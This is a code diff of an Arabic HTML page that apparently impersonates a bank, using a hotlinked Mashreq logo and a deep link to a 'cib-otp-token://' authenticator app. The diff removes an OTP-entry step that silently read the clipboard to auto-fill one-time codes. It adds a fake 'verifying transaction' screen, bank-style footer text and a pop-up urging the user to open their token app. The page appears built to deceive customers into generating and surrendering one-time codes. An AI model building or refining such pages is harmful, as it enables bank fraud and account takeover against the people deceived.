@@ -2,77 +2,136 @@
 <html lang="ar">
 <head>
 <meta charset="UTF-8">
-<title>رمز التحقق</title>
+<title>جاري التحقق</title>
 
 <style>
 body {
+  margin: 0;
   font-family: Arial;
-  background: #f9fafb;
+  background: #f5f5f5;
   text-align: center;
-  padding: 30px;
 }
 
-/* Loader */
-#loader {
-  margin-top: 80px;
+/* Container */
+.container {
+  padding: 30px 20px;
 }
 
+/* Logo */
+.logo {
+  margin-top: 20px;
+}
+
+.logo img {
+  width: 120px;
+}
+
+/* Shield */
+.icon-circle {
+  width: 90px;
+  height: 90px;
+  border: 2px solid #f97316;
+  border-radius: 50%;
+  margin: 40px auto;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: #f97316;
+  font-size: 30px;
+}
+
+/* Text */
+.title {
+  font-size: 20px;
+  font-weight: bold;
+}
+
+.subtitle {
+  color: #777;
+  margin-top: 10px;
+}
+
+/* Loader box */
+.loader-box {
+  margin-top: 30px;
+  padding: 15px;
+  border: 1px solid #f97316;
+  border-radius: 12px;
+  display: inline-flex;
+  align-items: center;
+  gap: 10px;
+  color: #f97316;
+}
+
+/* Spinner */
 .spinner {
-  width: 50px;
-  height: 50px;
-  border: 5px solid #ddd;
-  border-top: 5px solid #2563eb;
+  width: 20px;
+  height: 20px;
+  border: 3px solid #f97316;
+  border-top: 3px solid transparent;
   border-radius: 50%;
   animation: spin 1s linear infinite;
-  margin: auto;
 }
 
 @keyframes spin {
   100% { transform: rotate(360deg); }
 }
 
-/* Box */
-.card {
-  background: white;
-  padding: 20px;
-  border-radius: 16px;
-  margin-top: 30px;
-  box-shadow: 0 5px 20px rgba(0,0,0,0.08);
-}
-
-/* OTP */
-.otp-inputs input {
-  width: 45px;
-  height: 55px;
-  font-size: 20px;
-  text-align: center;
-  margin: 5px;
-  border: 1px solid #ddd;
-  border-radius: 10px;
-}
-
-/* Buttons */
-button {
+/* Footer */
+.footer {
+  position: fixed;
+  bottom: 0;
   width: 100%;
-  padding: 12px;
-  border: none;
-  border-radius: 12px;
-  font-size: 16px;
-  margin-top: 15px;
 }
 
-.primary {
-  background: #2563eb;
+.footer-top {
+  background: #0b4d8c;
   color: white;
+  padding: 10px;
 }
 
-.success {
-  background: #16a34a;
+.footer-bottom {
+  background: #f97316;
   color: white;
+  padding: 10px;
 }
 
-.hidden {
+/* Modal */
+.modal {
   display: none;
+  position: fixed;
+  top:0;
+  left:0;
+  width:100%;
+  height:100%;
+  background: rgba(0,0,0,0.5);
+  justify-content:center;
+  align-items:center;
+}
+
+.modal-box {
+  background:white;
+  padding:20px;
+  border-radius:16px;
+  width:90%;
+  max-width:320px;
+}
+
+button {
+  width:100%;
+  padding:12px;
+  border:none;
+  border-radius:10px;
+  margin-top:10px;
+}
+
+.btn-main {
+  background:#f97316;
+  color:white;
+}
+
+.btn-cancel {
+  background:#eee;
 }
 </style>
 
@@ -80,90 +139,62 @@ button {
 
 <body>
 
-<h2>رمز التحقق</h2>
+<div class="container">
 
-<!-- Loader -->
-<div id="loader">
-  <div class="spinner"></div>
-  <p>جاري التحضير...</p>
-</div>
-
-<!-- Step 1 -->
-<div id="step1" class="card hidden">
-  <p>لإكمال العملية، يرجى فتح تطبيق التوكن</p>
-  <button class="primary" onclick="openApp()">فتح تطبيق التوكن</button>
-</div>
-
-<!-- Step 2 OTP -->
-<div id="step2" class="card hidden">
-  <p>أدخل رمز التحقق</p>
-
-  <div class="otp-inputs">
-    <input maxlength="1">
-    <input maxlength="1">
-    <input maxlength="1">
-    <input maxlength="1">
-    <input maxlength="1">
-    <input maxlength="1">
+  <!-- Logo -->
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2b/Mashreq_logo.svg/512px-Mashreq_logo.svg.png">
   </div>
 
-  <button class="success" onclick="pasteCode()">📋 لصق الرمز</button>
+  <!-- Icon -->
+  <div class="icon-circle">🔒</div>
+
+  <!-- Text -->
+  <div class="title">جاري التحقق من العملية</div>
+  <div class="subtitle">يرجى الانتظار قليلاً بينما يتم التحقق</div>
+
+  <!-- Loader -->
+  <div class="loader-box">
+    <div class="spinner"></div>
+    جاري المعالجة
+  </div>
+
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="footer-top">📞 تحتاج إلى مساعدة؟</div>
+  <div class="footer-bottom">أماكن الفروع وماكينات</div>
+</div>
+
+<!-- Modal -->
+<div id="modal" class="modal">
+  <div class="modal-box">
+    <h3>فتح تطبيق التوكن</h3>
+    <p>سيتم تحويلك لإكمال التحقق</p>
+
+    <button class="btn-main" onclick="openApp()">حسناً</button>
+    <button class="btn-cancel" onclick="closeModal()">إلغاء</button>
+  </div>
 </div>
 
 <script>
 
-// ⏳ Loader → Step1
+// بعد 4 ثواني يظهر Popup
 setTimeout(() => {
-  document.getElementById("loader").style.display = "none";
-  document.getElementById("step1").classList.remove("hidden");
+  document.getElementById("modal").style.display = "flex";
 }, 4000);
 
-// 🚀 فتح التطبيق
+// فتح التطبيق
 function openApp() {
   localStorage.setItem("openedApp", "true");
-
   window.location.href = "cib-otp-token://";
 }
 
-// 📋 لصق الكود
-async function pasteCode() {
-  try {
-    let text = await navigator.clipboard.readText();
-    fillInputs(text);
-  } catch {
-    alert("اسمح بالوصول للحافظة");
-  }
+// إغلاق
+function closeModal() {
+  document.getElementById("modal").style.display = "none";
 }
-
-// تعبئة OTP
-function fillInputs(code) {
-  code = code.replace(/\D/g, "");
-
-  const inputs = document.querySelectorAll(".otp-inputs input");
-
-  inputs.forEach((input, i) => {
-    input.value = code[i] || "";
-  });
-}
-
-// 🔥 عند الرجوع من التطبيق
-window.addEventListener("focus", async () => {
-
-  if (localStorage.getItem("openedApp") === "true") {
-
-    document.getElementById("step1").classList.add("hidden");
-    document.getElementById("step2").classList.remove("hidden");
-
-    // Auto paste
-    try {
-      let text = await navigator.clipboard.readText();
-
-      if (text.length >= 4) {
-        fillInputs(text);
-      }
-    } catch {}
-  }
-});
 
 </script>
 
